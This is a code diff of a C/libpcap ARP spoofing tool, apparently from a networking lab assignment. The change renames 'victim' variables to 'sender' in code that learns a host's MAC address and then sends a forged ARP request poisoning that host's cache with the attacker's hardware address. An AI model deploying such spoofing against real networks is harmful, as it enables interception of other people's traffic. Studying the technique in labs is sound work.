@@ -163,9 +163,9 @@ int main(int argc, char **argv)
     char                    *interface;
     char                    errbuf[PCAP_ERRBUF_SIZE];
     struct ether_addr       attacker_ha;
-    struct ether_addr       victim_ha;
+    struct ether_addr       sender_ha;
     struct in_addr          attacker_ip;
-    struct in_addr          victim_ip;
+    struct in_addr          sender_ip;
     struct in_addr          target_ip;
     u_char                  arpPacket[sizeof(struct ether_header) + sizeof(struct arp_addr) + sizeof(struct arp_addr)];
     int                     res;
@@ -182,7 +182,7 @@ int main(int argc, char **argv)
     }
 
     interface = argv[1];
-    inet_aton(argv[2], &victim_ip);
+    inet_aton(argv[2], &sender_ip);
     inet_aton(argv[3], &target_ip);
 
     if(getMyHwAddr(&attacker_ha, interface)==0)
@@ -203,7 +203,7 @@ int main(int argc, char **argv)
         return -1;
     }
 
-    makeARPBroadcastPacket(arpPacket, attacker_ha, attacker_ip, victim_ip);
+    makeARPBroadcastPacket(arpPacket, attacker_ha, attacker_ip, sender_ip);
     if(pcap_sendpacket(handle, arpPacket, sizeof(arpPacket))!=0)
     {
         fprintf(stderr, "Couldn't send the packet\n");
@@ -226,16 +226,16 @@ int main(int argc, char **argv)
                 
             {
                 arp_addr = (struct arp_addr *) (packet + sizeof(struct ether_header) + sizeof(struct arphdr));
-                if(!cmpHwAddr(arp_addr->tha, attacker_ha) && !cmpIpAddr(arp_addr->sip, victim_ip) && !cmpIpAddr(arp_addr->tip, attacker_ip))
+                if(!cmpHwAddr(arp_addr->tha, attacker_ha) && !cmpIpAddr(arp_addr->sip, sender_ip) && !cmpIpAddr(arp_addr->tip, attacker_ip))
                 {
-                    victim_ha = arp_addr->sha;
+                    sender_ha = arp_addr->sha;
                     break;
                 }
             }
         }
     }
 
-    makeARPPacket(arpPacket, attacker_ha, victim_ha, target_ip, victim_ip, ARPOP_REQUEST);
+    makeARPPacket(arpPacket, attacker_ha, sender_ha, target_ip, sender_ip, ARPOP_REQUEST);
     if(pcap_sendpacket(handle, arpPacket, sizeof(arpPacket))!=0)
     {
         fprintf(stderr, "Couldn't send the packet\n");
